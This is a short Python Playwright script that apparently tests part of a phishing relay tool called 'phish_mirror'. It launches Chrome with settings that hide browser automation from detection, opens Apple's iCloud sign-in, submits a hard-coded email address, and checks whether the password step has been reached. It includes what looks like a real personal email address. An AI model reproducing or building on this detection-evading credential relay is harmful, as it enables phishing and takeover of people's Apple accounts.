#!/usr/bin/env python3
"""Quick forward_email test with stealth-ish launch."""
from playwright.sync_api import sync_playwright
import phish_mirror as pm
import time

EMAIL = "gutbits@gmail.com"

with sync_playwright() as p:
    browser = p.chromium.launch(
        channel="chrome",
        headless=False,
        args=["--disable-blink-features=AutomationControlled"],
    )
    ctx = browser.new_context(viewport={"width": 1000, "height": 940})
    ctx.add_init_script(
        "Object.defineProperty(navigator, 'webdriver', {get: () => undefined});"
    )
    page = ctx.new_page()
    frame = pm.open_icloud_sign_in(page)
    ok = pm.forward_email(page, frame, EMAIL)
    frame = pm.find_apple_frame(page, frame)
    print("forward_email:", ok)
    print("password_step_ready:", pm.apple_password_step_ready(frame))
    print("account on apple:", pm._apple_account_email(frame))
    time.sleep(10)
    browser.close()

